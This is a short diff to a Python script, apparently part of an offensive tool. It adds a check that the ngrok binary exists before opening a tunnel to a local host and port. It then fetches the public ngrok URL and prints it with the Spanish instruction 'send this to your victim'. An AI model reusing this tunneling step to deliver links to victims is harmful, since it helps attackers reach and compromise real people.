@@ -40,11 +40,14 @@ def ip():
     : """))
 
     if seleccion == "01" or seleccion == "1":
-        
-        os.system("./ngrok http {0}:{1} > /dev/null &".format(HOST, PORT))
-        time.sleep(10)
-        print("Envia esto a tu victima: ")
-        print(str(os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o https://[0-9a-z]*\.ngrok.io\n")))
+        if os.path.exists("ngrok") == False:
+            print("Descarga Ngrok porfavor")
+            sys.exit()
+        else:
+            os.system("./ngrok http {0}:{1} > /dev/null &".format(HOST, PORT))
+            time.sleep(10)
+            print("Envia esto a tu victima: ")
+            print(str(os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o https://[0-9a-z]*\.ngrok.io\n")))
     if seleccion == "02" or seleccion == "2":
         print("Envia esto a tu victima:{0}:{1}".format(HOST, PORT))
     if seleccion == "03" or seleccion == "3":
